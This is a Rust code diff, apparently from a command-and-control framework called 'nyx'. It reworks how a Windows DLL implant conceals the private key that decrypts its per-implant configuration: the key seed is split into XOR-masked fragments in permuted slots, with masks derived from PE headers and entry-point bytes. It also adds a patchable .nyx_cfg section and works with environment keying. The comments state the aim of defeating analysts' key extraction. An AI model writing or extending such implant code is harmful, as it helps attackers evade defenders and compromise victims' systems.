@@ -7,18 +7,28 @@
 //! ```text
 //! [0xDEADBEEF magic (4B LE)]
 //! [keying_levels    (4B LE)]  -- env-keying bitmap (0 = disabled)
-//! [config_data_len  (2B LE)]  -- nonce + ct + tag bytes (12+N+16)
-//! [implant_priv     (32B)]    -- X25519 static secret, PLAINTEXT
+//! [config_data_len  (2B LE)]  -- ct + tag bytes (N+16)
 //! [config_nonce     (12B)]
+//! [fragment slots   (32B)]    -- 4 × 8B scattered, permuted, XOR-obfuscated
+//!                                 key_seed fragments (HKDF-Chain Key Concealment)
 //! [encrypted_config (N B)]    -- ChaCha20-Poly1305 AEAD
 //! [poly1305_tag     (16B)]
 //! [padding to 1024B]
 //! ```
 //!
-//! The implant derives the config encryption key via:
-//!   shared = X25519_ECDH(implant_priv, baked_server_pub)
-//!   config_key = HKDF-SHA256(shared, "nyx-implant-config-v1",
-//!                            server_pub || implant_pub)
+//! ## Key recovery (HKDF-Chain Key Concealment)
+//!
+//! The implant's X25519 private key is NEVER stored. Instead, a 32-byte key_seed
+//! is split into 4 fragments, each XOR-obfuscated with a different PE-region-
+//! derived mask, and stored in permuted order. Recovery:
+//!
+//! 1. Derive 4 XOR masks from 4 non-overlapping 1024-byte PE header regions
+//! 2. Compute fragment permutation from djb2(entry_point_bytes[0..16])
+//! 3. Read 4 fragments from permuted slots, un-XOR with each mask
+//! 4. Assemble key_seed in logical order
+//! 5. implant_priv = HKDF-SHA256(key_seed, "nyx-implant-key-v1", server_pub)
+//!    with X25519 clamping
+//! 6. config_key = ECDH(implant_priv, server_pub) + HKDF (as before)
 //!
 //! If the section is unpatched (magic `0x41414141`), we fall back to the
 //! compile-time config baked by `build.rs` — the dev/CI path.
@@ -58,34 +68,132 @@ fn nyx_cfg_ptr() -> Option<(*const u8, *const u8)> {
     None
 }
 
-/// Derive a 32-byte obfuscation mask from PE header bytes.
-///
-/// This mask is XOR'd with the implant's X25519 private key before writing it
-/// to `.nyx_cfg`, so the key is never in plaintext on disk. The server
-/// computes the same mask at generation time via `derive_mask_from_bytes()` in
-/// `crates/server/src/implant_gen.rs` — both sides MUST produce identical output.
-///
-/// Not cryptographic: an analyst who reverse-engineers the algorithm can
-/// recover the key. But it defeats trivial static extraction (grep for
-/// 0xDEADBEEF → read 32 bytes → key in hand). Recovery now requires
-/// understanding the XOR scheme and replicating the header mixing.
-fn compute_pe_mask(base: *const u8) -> [u8; 32] {
-    let header_len = core::cmp::min(4096usize, 0x1000);
-    let header = unsafe { core::slice::from_raw_parts(base, header_len) };
-    derive_mask_from_bytes(header)
-}
+// ══════════════════════════════════════════════════════════════════════════════
+// HKDF-Chain Key Concealment helpers
+// ══════════════════════════════════════════════════════════════════════════════
+//
+// All functions in this section that derive mask/permutation/seed material
+// MUST be byte-for-byte identical to their mirror copies in
+// `crates/server/src/implant_gen.rs`. Any divergence breaks key recovery at
+// runtime (AEAD tag mismatch → silent fallback to compile-time config). The
+// input *window* is also mirrored: both sides read only the PE headers region
+// `0..SizeOfHeaders`, which is byte-identical on disk (file layout) and in
+// memory (mapped layout) — PE headers carry no fixups, so the two layouts
+// agree there.
 
-/// Core mask derivation: XOR-stride accumulation over the input bytes.
-/// MUST match the server-side copy of this function exactly.
-fn derive_mask_from_bytes(data: &[u8]) -> [u8; 32] {
-    let mut mask = [0x5Au8; 32]; // non-zero seed
+/// Derive an 8-byte XOR mask from the PE headers region, distinguished per
+/// fragment by the `region` index.
+///
+/// All 4 fragments observe the *same* byte window (`data`, the full
+/// `0..SizeOfHeaders` slice); the `region` value mixes into the hash so each
+/// fragment still gets a distinct 8-byte mask. This avoids the earlier
+/// 1024-byte-window split that crossed into file/memory-divergent territory.
+fn derive_fragment_mask(data: &[u8], region: u8) -> [u8; 8] {
+    let mut mask = [0u8; 8];
+    // Seed the state with the region so each fragment's mask diverges even
+    // before any input bytes are consumed. The seed values are spread across
+    // the 8 lanes so no two regions produce the same starting state.
+    mask[0] = region.wrapping_mul(0x9E).wrapping_add(0x5A);
+    mask[1] = region.wrapping_mul(0x37).wrapping_add(0xA5);
+    mask[2] = region.rotate_left(3).wrapping_add(0x3C);
+    mask[3] = region.rotate_left(5) ^ 0xC3;
+    mask[4] = region.wrapping_mul(region).wrapping_add(0x5A);
+    mask[5] = region ^ (region.wrapping_mul(0x1F));
+    mask[6] = region.rotate_left(2).wrapping_add(0x96);
+    mask[7] = region.wrapping_mul(0x6A) ^ 0x69;
     for (j, &b) in data.iter().enumerate() {
-        mask[j % 32] ^= b;
-        let idx = (j.wrapping_mul(17).wrapping_add(7)) % 32;
-        mask[idx] = mask[idx].wrapping_add(b).rotate_left((j % 7) as u32);
+        mask[j % 8] = mask[j % 8].wrapping_mul(31).wrapping_add(b);
+        mask[(j.wrapping_mul(5).wrapping_add(3)) % 8] ^= b.rotate_left((j % 7) as u32);
+    }
+    // Second pass: avalanche — each byte absorbs its neighbours
+    for _ in 0..4 {
+        for i in 0..8 {
+            mask[i] = mask[i].wrapping_add(mask[(i + 3) % 8]).rotate_left(3);
+        }
     }
     mask
 }
+
+/// Fisher-Yates shuffle seeded by an LCG PRNG to produce a deterministic
+/// permutation of [0, 1, 2, 3] from a 32-bit seed.
+///
+/// The permutation determines which fragment slot stores which fragment.
+fn derive_permutation(seed: u32) -> [u8; 4] {
+    let mut order = [0u8, 1u8, 2u8, 3u8];
+    let mut state = seed;
+    // Fisher-Yates with LCG: state = state * 1103515245 + 12345
+    for i in (1..4).rev() {
+        state = state.wrapping_mul(1103515245).wrapping_add(12345);
+        let j = (state >> 16) as usize % (i + 1);
+        order.swap(i, j);
+    }
+    order
+}
+
+/// djb2 hash over raw bytes (no case-folding — used for binary data like
+/// entry point machine code, not strings).
+fn djb2_raw(data: &[u8]) -> u32 {
+    let mut h: u32 = 5381;
+    for &b in data {
+        h = h.wrapping_mul(33).wrapping_add(b as u32);
+    }
+    h
+}
+
+/// Apply X25519 scalar clamping to a 32-byte key.
+/// - Clear the low 3 bits of byte 0
+/// - Clear the high bit of byte 31
+/// - Set the penultimate bit of byte 31
+fn clamp_scalar(mut s: [u8; 32]) -> [u8; 32] {
+    s[0] &= 0xF8;
+    s[31] &= 0x7F;
+    s[31] |= 0x40;
+    s
+}
+
+/// Read the entry point RVA from the running PE image's optional header.
+/// Returns 0 if the header is unparseable.
+fn get_entry_point_rva(base: *const u8) -> u32 {
+    let pe_offset = unsafe { *(base.add(0x3C) as *const i32) } as isize;
+    if pe_offset <= 0 {
+        return 0;
+    }
+    // COFF header = pe_header + 4, optional header = coff + 20
+    // Entry point RVA = optional header offset 16 (u32 LE)
+    let opt_header = unsafe { base.offset(pe_offset).add(4).add(20) };
+    unsafe { *(opt_header.add(16) as *const u32) }
+}
+
+/// Read the PE `SizeOfHeaders` field (Optional Header +0x3C, u32 LE; same
+/// offset for PE32 and PE32+). This is the byte-identical-on-disk-and-in-
+/// memory region used for mask derivation. Returns 0 if unparseable.
+///
+/// **MUST match the server-side copy EXACTLY.**
+fn get_size_of_headers(base: *const u8) -> u32 {
+    let pe_offset = unsafe { *(base.add(0x3C) as *const i32) } as isize;
+    if pe_offset <= 0 {
+        return 0;
+    }
+    // Optional Header = PE sig + 4 (COFF) + 20. SizeOfHeaders at opt +0x3C.
+    let opt_header = unsafe { base.offset(pe_offset).add(4).add(20) };
+    unsafe { *(opt_header.add(0x3C) as *const u32) }
+}
+
+/// Read the PE `SizeOfImage` field (Optional Header +0x38, u32 LE; same
+/// offset for PE32 and PE32+). Used as the upper bound for runtime RVA
+/// bounds-checking. Returns 0 if unparseable.
+fn get_size_of_image(base: *const u8) -> u32 {
+    let pe_offset = unsafe { *(base.add(0x3C) as *const i32) } as isize;
+    if pe_offset <= 0 {
+        return 0;
+    }
+    let opt_header = unsafe { base.offset(pe_offset).add(4).add(20) };
+    unsafe { *(opt_header.add(0x38) as *const u32) }
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// Config types
+// ══════════════════════════════════════════════════════════════════════════════
 
 /// Extra fields that may come from a per-implant (patched) config.
 /// All fields are optional — compile-time builds have them all as `None`/`0`.
@@ -156,18 +264,107 @@ pub fn load_runtime_config(
         return None;
     }
 
-    // Read obfuscated implant private key (32B at bytes 10-41).
-    // The key is XOR-obfuscated with a per-template mask — it is never stored
-    // in plaintext on disk. We must reverse the XOR before using it.
-    let obfuscated_priv: [u8; 32] = section[10..42].try_into().ok()?;
-    let pe_mask = compute_pe_mask(base);
-    let mut implant_priv = obfuscated_priv;
-    for i in 0..32 {
-        implant_priv[i] ^= pe_mask[i];
+    // Read config nonce (12B at bytes 10-21).
+    let config_nonce: [u8; 12] = section[10..22].try_into().ok()?;
+
+    // ── HKDF-Chain Key Concealment: recover key_seed from fragments ──────────
+    //
+    // The server splits the 32B key_seed into 4 fragments, XOR-obfuscates each
+    // with a different mask derived from the PE headers region, and stores
+    // them in permuted order. We reverse this to recover the seed, then derive
+    // the actual X25519 private key via HKDF.
+
+    // 1. Read only the PE headers region (`0..SizeOfHeaders`). This range is
+    //    byte-identical on disk and in our memory map (PE headers carry no
+    //    fixups), so it matches what the server used at generation time.
+    //    Reading beyond SizeOfHeaders would diverge (file layout has section
+    //    raw data where memory has zero-fill).
+    let soh = {
+        let v = get_size_of_headers(base) as usize;
+        // Clamp to a sane upper bound so a corrupt SizeOfHeaders can't make
+        // us slice out of the mapped image. 4096 is generous; real DLLs are
+        // typically 0x200–0x800.
+        v.min(4096)
+    };
+    let header = if soh > 0 {
+        unsafe { core::slice::from_raw_parts(base, soh) }
+    } else {
+        // SizeOfHeaders unparseable — server side hits the same condition and
+        // derives masks from an empty slice (region seed alone determines
+        // the mask). Both sides stay in lockstep.
+        &[]
+    };
+    let masks: [[u8; 8]; 4] = [
+        derive_fragment_mask(header, 0),
+        derive_fragment_mask(header, 1),
+        derive_fragment_mask(header, 2),
+        derive_fragment_mask(header, 3),
+    ];
+
+    // 2. Compute fragment permutation from entry point bytes.
+    //
+    // Bounds-check against SizeOfImage before dereferencing base+entry_rva —
+    // a corrupt/abnormal RVA must not cause an out-of-mapping read. When the
+    // RVA is invalid or unreadable, fall back to hashing the same header
+    // window used for mask derivation (so both fallback paths use the
+    // identical byte slice the server would use).
+    let entry_rva = get_entry_point_rva(base);
+    let size_of_image = get_size_of_image(base) as usize;
+    let order_seed = if entry_rva != 0
+        && size_of_image != 0
+        && (entry_rva as usize) + 16 <= size_of_image
+    {
+        let ep_bytes =
+            unsafe { core::slice::from_raw_parts(base.add(entry_rva as usize), 16) };
+        djb2_raw(ep_bytes)
+    } else {
+        // Fallback: hash the same header window (matches server fallback).
+        djb2_raw(header)
+    };
+    let frag_order = derive_permutation(order_seed);
+
+    // 3. Read 4 fragments from scattered positions, un-XOR, and assemble.
+    //
+    // The server stores fragment `frag_order[slot]` at position 22+slot*8,
+    // XOR-obfuscated with mask[frag_order[slot]]. We read each slot, un-XOR
+    // with the correct mask, and place the fragment at its logical position
+    // in key_seed.
+    let mut key_seed = [0u8; 32];
+    for slot in 0..4usize {
+        let frag_idx = frag_order[slot] as usize;
+        let pos = 22 + slot * 8;
+        if pos + 8 > 1024 {
+            return None;
+        }
+        let mut fragment = [0u8; 8];
+        fragment.copy_from_slice(&section[pos..pos + 8]);
+        // Un-XOR with the fragment's mask.
+        for j in 0..8 {
+            fragment[j] ^= masks[frag_idx][j];
+        }
+        key_seed[frag_idx * 8..frag_idx * 8 + 8].copy_from_slice(&fragment);
     }
 
-    // Read config nonce (12B at bytes 42-53).
-    let config_nonce: [u8; 12] = section[42..54].try_into().ok()?;
+    // 4. Derive implant_priv = HKDF-SHA256(key_seed, "nyx-implant-key-v1",
+    //    server_pub) with X25519 clamping.
+    let server_pub = crate::server_pub::SERVER_PUB;
+    let mut derived_priv = [0u8; 32];
+    nyx_protocol::crypto::hkdf_sha256(
+        &key_seed,
+        b"nyx-implant-key-v1",
+        &server_pub,
+        &mut derived_priv,
+    );
+    let implant_priv = clamp_scalar(derived_priv);
+    // Zero intermediates.
+    for b in derived_priv.iter_mut() {
+        *b = 0;
+    }
+    for b in key_seed.iter_mut() {
+        *b = 0;
+    }
+
+    // ── End HKDF-Chain Key Concealment ───────────────────────────────────────
 
     // Read encrypted config + tag (bytes 54..54+data_len).
     if 54 + data_len > 1024 {
@@ -176,7 +373,6 @@ pub fn load_runtime_config(
     let ct_with_tag = &section[54..54 + data_len];
 
     // Derive config_key via ECDH(implant_priv, server_pub) + HKDF-SHA256.
-    let server_pub = crate::server_pub::SERVER_PUB;
     let mut config_key = derive_config_key(&implant_priv, &server_pub)?;
 
     // Apply environment keying layers BEFORE decryption so the AEAD tag
@@ -248,6 +444,39 @@ pub fn load_runtime_config(
 
     Some((cfg, implant, plaintext))
 }
+
+// ══════════════════════════════════════════════════════════════════════════════
+// .nyx_cfg section — placeholder for server-side per-implant patching
+// ══════════════════════════════════════════════════════════════════════════════
+//
+// This static materializes the `.nyx_cfg` PE section in the compiled DLL
+// template. `nyx_cfg_ptr()` above locates it at runtime by walking the section
+// table; the server's `generate_implant` finds it by scanning for the
+// `0x41414141` magic + `0xAA` padding, then overwrites the section in-place
+// with the per-implant HKC blob (`0xDEADBEEF` magic + fragments + ciphertext).
+//
+// Layout (template / unpatched state):
+//   bytes 0-3:    0x41414141 (magic — "not yet patched")
+//   bytes 4-1023: 0xAA       (sentinel padding — lets the server confirm it
+//                             found the right 1024-byte window)
+//
+// `#[used]` prevents the linker from discarding the symbol as unreferenced
+// (no Rust code reads it directly — `nyx_cfg_ptr()` resolves it via the PE
+// section table, not by symbol name). `#[link_section]` places it in a
+// dedicated PE section so the server can locate and patch a contiguous
+// 1024-byte region without colliding with `.rdata` or `.text`.
+
+#[used]
+#[link_section = ".nyx_cfg"]
+#[no_mangle]
+pub static NYX_CFG_PLACEHOLDER: [u8; 1024] = {
+    let mut buf = [0xAAu8; 1024];
+    buf[0] = 0x41;
+    buf[1] = 0x41;
+    buf[2] = 0x41;
+    buf[3] = 0x41;
+    buf
+};
 
 /// Derive the per-implant config encryption key:
 ///   shared = X25519_ECDH(implant_priv, server_pub)
